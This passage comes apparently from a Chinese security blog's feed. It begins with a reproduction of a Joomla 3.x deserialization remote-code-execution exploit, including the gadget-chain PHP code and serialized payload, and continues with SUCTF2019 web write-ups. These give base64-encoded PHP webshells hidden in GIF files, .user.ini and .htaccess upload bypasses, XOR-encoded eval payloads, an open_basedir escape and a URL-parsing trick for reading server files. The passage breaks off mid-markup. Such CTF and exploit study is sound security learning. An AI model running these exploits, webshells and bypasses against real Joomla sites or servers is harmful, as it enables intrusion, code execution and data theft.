class="title">get_host</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;host;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get the port</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_port</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;port;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get the path</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_path</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get the query</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_query</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;query;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get the fragment</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_fragment</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fragment;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">purl</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$iri = <span class="keyword">new</span> SimplePie_IRI($url);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'scheme'</span> =&gt; (string) $iri-&gt;get_scheme(),</span><br><span class="line"><span class="string">'authority'</span> =&gt; (string) $iri-&gt;get_authority(),</span><br><span class="line"><span class="string">'path'</span> =&gt; (string) $iri-&gt;get_path(),</span><br><span class="line"><span class="string">'query'</span> =&gt; (string) $iri-&gt;get_query(),</span><br><span class="line"><span class="string">'fragment'</span> =&gt; (string) $iri-&gt;get_fragment()</span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="string">"whoami || $m='http://yemoli.top';"</span>;</span><br><span class="line">var_dump(purl($a));</span><br></pre></td></tr></table></figure><p><code>Output</code></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">array(<span class="number">5</span>) &#123;</span><br><span class="line">  [<span class="string">"scheme"</span>]=&gt;</span><br><span class="line">  <span class="type">string</span>(<span class="number">16</span>) <span class="string">"whoami || ='http"</span></span><br><span class="line">  [<span class="string">"authority"</span>]=&gt;</span><br><span class="line">  <span class="type">string</span>(<span class="number">12</span>) <span class="string">"yemoli.top';"</span></span><br><span class="line">  [<span class="string">"path"</span>]=&gt;</span><br><span class="line">  <span class="type">string</span>(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">  [<span class="string">"query"</span>]=&gt;</span><br><span class="line">  <span class="type">string</span>(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">  [<span class="string">"fragment"</span>]=&gt;</span><br><span class="line">  <span class="type">string</span>(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>exp</code>编写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JDatabaseDriverMysqli</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> $disconnectHandlers = <span class="keyword">array</span>([<span class="string">'SimplePie'</span>,<span class="string">'init'</span>],<span class="string">'yml'</span>);</span><br><span class="line"><span class="keyword">protected</span> $connection = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">protected</span> $a;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">$m = <span class="keyword">new</span> SimplePie();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;disconnect();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">disconnect</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;connection)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;disconnectHandlers <span class="keyword">as</span> $h)</span><br><span class="line">&#123;</span><br><span class="line">call_user_func_array($h, <span class="keyword">array</span>( &amp;<span class="keyword">$this</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//mysqli_close($this-&gt;connection);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;connection = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JSimplepieFactory</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JDatabaseDriverMysql</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimplePie</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> $feed_url=<span class="string">"phpinfo()||http://yml.top"</span>;</span><br><span class="line"><span class="keyword">var</span> $javascript = <span class="number">9999</span>;</span><br><span class="line"><span class="keyword">var</span> $raw_data = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">var</span> $cache = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">var</span> $sanitize;</span><br><span class="line"><span class="keyword">var</span> $cache_name_function = <span class="string">"assert"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;sanitize = <span class="keyword">new</span> JDatabaseDriverMysql;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'used!!!'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;feed_url !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">$parsed_feed_url = parse_url(<span class="keyword">$this</span>-&gt;feed_url);</span><br><span class="line"><span class="comment">// Decide whether to enable caching</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;cache &amp;&amp; $parsed_feed_url[<span class="string">'scheme'</span>] !== <span class="string">''</span>)</span><br><span class="line">&#123;</span><br><span class="line">$cache = call_user_func(<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;cache_class, <span class="string">'create'</span>), <span class="keyword">$this</span>-&gt;cache_location, call_user_func(<span class="keyword">$this</span>-&gt;cache_name_function, <span class="keyword">$this</span>-&gt;feed_url), <span class="string">'spc'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> JDatabaseDriverMysqli;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>Output</code></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:21</span><span class="selector-pseudo">:"JDatabaseDriverMysqli"</span><span class="selector-pseudo">:3</span>:&#123;<span class="attribute">s</span>:<span class="number">21</span>:<span class="string">"*disconnectHandlers"</span>;<span class="attribute">a</span>:<span class="number">2</span>:&#123;i:<span class="number">0</span>;<span class="attribute">a</span>:<span class="number">2</span>:&#123;i:<span class="number">0</span>;<span class="attribute">s</span>:<span class="number">9</span>:<span class="string">"SimplePie"</span>;<span class="attribute">i</span>:<span class="number">1</span>;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"init"</span>;&#125;<span class="selector-tag">i</span><span class="selector-pseudo">:1</span>;<span class="selector-tag">s</span><span class="selector-pseudo">:3</span><span class="selector-pseudo">:"yml"</span>;&#125;<span class="selector-tag">s</span><span class="selector-pseudo">:13</span><span class="selector-pseudo">:"</span>*<span class="selector-tag">connection</span>";<span class="selector-tag">b</span><span class="selector-pseudo">:1</span>;<span class="selector-tag">s</span><span class="selector-pseudo">:4</span><span class="selector-pseudo">:"</span>*<span class="selector-tag">a</span>";<span class="selector-tag">N</span>;&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;前段时间意大利安全研究员Alessandro Groppo 公开了joomla3.0.0-3.4.6的漏洞详情，今天借此机会复现分析一下&lt;/
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="https://yml-sec.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>SUCTF2019部分web题解</title>
    <link href="https://yml-sec.top/2019/08/19/SUCTF2019%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/"/>
    <id>https://yml-sec.top/2019/08/19/SUCTF2019%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/</id>
    <published>2019-08-19T04:24:28.000Z</published>
    <updated>2019-08-19T15:20:39.296Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h1><p>题目是一个上传页面，中间件是nginx，尝试上传正常的图片返回如下结果</p><p><img src="https://i.loli.net/2019/08/19/bYqBDjaxR79t8Ul.png" alt=""></p><p>很奇怪的是路径下存在index.php，经过测试后发现改题目上传时对图片头也进行了校验，同时检验文件中是否存在&lt;?，搜索利用到这篇文章</p><p><a href="http://drops.xmd5.com/static/drops/tips-3424.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-3424.html</a></p><p>利用.user.ini的设置来解析不是php后缀的文件，同时为了绕过&lt;?的检验使用伪协议</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//.user.ini</span><br><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=<span class="string">"php://filter/convert.base64-decode/resource=12.gif"</span></span><br></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//12.gif</span></span><br><span class="line">GIF<span class="number">89</span>a<span class="number">12</span>PD<span class="number">9</span>waHAgQGV<span class="number">2</span>YWwoJF<span class="number">9</span>QT<span class="number">1</span><span class="symbol">NUW2</span>FdKTs/Pg==</span><br></pre></td></tr></table></figure><p>最后直接读flag就好</p><p><img src="https://i.loli.net/2019/08/19/QqerPExJ5jGgCLA.png" alt=""></p><h1 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h1><p>题目源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>正则过滤了绝大部分可用字符串，可以使用多个字符异或进行构造，但是直接调用函数长度明显是不够的，这里可以用GET的方式传入我们想要调用的函数，首先FUZZ出_GET</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">target = <span class="string">"_GET"</span></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> tar <span class="keyword">in</span> target:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">255</span>):</span><br><span class="line">        temp = <span class="number">233</span>^i</span><br><span class="line">        <span class="keyword">if</span> chr(temp) == tar:</span><br><span class="line">            payload = payload+str(hex(i))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">head = <span class="string">"%e9"</span>*<span class="number">4</span></span><br><span class="line">payload = payload.replace(<span class="string">"0x"</span>,<span class="string">"%"</span>)</span><br><span class="line">print(head+<span class="string">"^"</span>+payload)</span><br></pre></td></tr></table></figure><p>output</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">%e</span>9<span class="built_in">%e</span>9<span class="built_in">%e</span>9<span class="built_in">%e</span>9<span class="symbol">^%b6</span><span class="built_in">%ae</span><span class="built_in">%ac</span><span class="built_in">%bd</span></span><br></pre></td></tr></table></figure><p>然后有如下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br></pre></td></tr></table></figure><p>这里需要使字符串去重后小于等于12，于是构造出如下payload</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="meta">%e9</span><span class="meta">%e9</span><span class="meta">%e9</span><span class="meta">%e9</span>^<span class="meta">%b6</span><span class="meta">%ae</span><span class="meta">%ac</span><span class="meta">%bd</span>&#125;&#123;<span class="meta">%bd</span>&#125;();</span><br></pre></td></tr></table></figure><p>然后调用函数 <code>get_the_flag()</code> 并构造上传表单</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://47.111.59.243:9001/?_=$&#123;%e9%e9%e9%e9^%b6%ae%ac%bd&#125;&#123;%bd&#125;();&amp;%bd=get_the_flag"</span> <span class="attr">method</span>=<span class="string">"post"</span></span></span><br><span class="line"><span class="tag"><span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"file"</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"file"</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上传这里需要绕过图片头和&lt;?的校验，可以用.htaccess</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//.htaccess</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> xlogo_width 200</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> xlogo_height 200</span></span><br><span class="line">AddType application/x-httpd-php .gif</span><br><span class="line">php_value auto_append_file <span class="string">"php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_8dda1f908043a81b3539472e2846b908/evil.gif"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//evil.gif</span></span><br><span class="line">GIF89a12PD9waHAgZXZhbCgkX1BPU1RbJ2MnXSk7Pz4=</span><br></pre></td></tr></table></figure><p>成功的getshell后访问跟目录时才发现是没有权限的，查看phpinfo的信息可以看到开启了open_basedir</p><p><img src="https://i.loli.net/2019/08/19/fahr5C1sOxvwBl4.png" alt=""></p><p>同时还禁用了一些函数</p><p><img src="https://i.loli.net/2019/08/19/MNj5XRCynTAGSq4.png" alt=""></p><p>尝试baypass open_basedir并用scandir()查看跟目录文件</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'upload'</span>);<span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);<span class="selector-tag">var_dump</span>(scandir(<span class="string">'/'</span>));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/19/2qDlnVemMB3W54K.png" alt=""></p><p>读取flag</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'upload'</span>);<span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);<span class="selector-tag">var_dump</span>(scandir(<span class="string">'/'</span>));<span class="selector-tag">chdir</span>(<span class="string">'/'</span>);<span class="selector-tag">var_dump</span>(file_get_contents(<span class="string">'THis_Is_tHe_F14g'</span>));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/19/MSxE3dIWkBDoRKe.png" alt=""></p><h1 id="Pythonginx"><a href="#Pythonginx" class="headerlink" title="Pythonginx"></a>Pythonginx</h1><p>主要代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br></pre></td></tr></table></figure><p>我们需要最后利用下面的代码来读取文件</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">return</span> <span class="selector-tag">urllib</span><span class="selector-class">.request</span><span class="selector-class">.urlopen</span>(<span class="selector-tag">finalUrl</span>)<span class="selector-class">.read</span>()</span><br></pre></td></tr></table></figure><p>附上调试代码</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from urllib.parse import *</span><br><span class="line">url = <span class="string">"file://suctf.cc"</span></span><br><span class="line">host = urlparse(url)</span><br><span class="line">print(host.hostname)</span><br><span class="line">parts = list(urlsplit(url))</span><br><span class="line">print(parts)</span><br><span class="line">host = parts[1]</span><br><span class="line"><span class="section">print("host:"+host)</span></span><br><span class="line">print(parts)</span><br><span class="line">finalUrl = urlunsplit(parts).split(' ')[0]</span><br><span class="line">print(finalUrl)</span><br><span class="line">host = urlparse(finalUrl).hostname</span><br><span class="line"><span class="section">print("host:"+host)</span></span><br></pre></td></tr></table></figure><p>根据提示先读取nginx配置文件得到flag路径，然后读取flag</p><p><img src="https://i.loli.net/2019/08/19/zj17Pwx4mDdgpFK.png" alt=""></p><p><img src="https://i.loli.net/2019/08/19/AzgwZrDQ4xs7B2h.png" alt=""></p><h1 id="easy-sql"><a href="#easy-sql" class="headerlink" 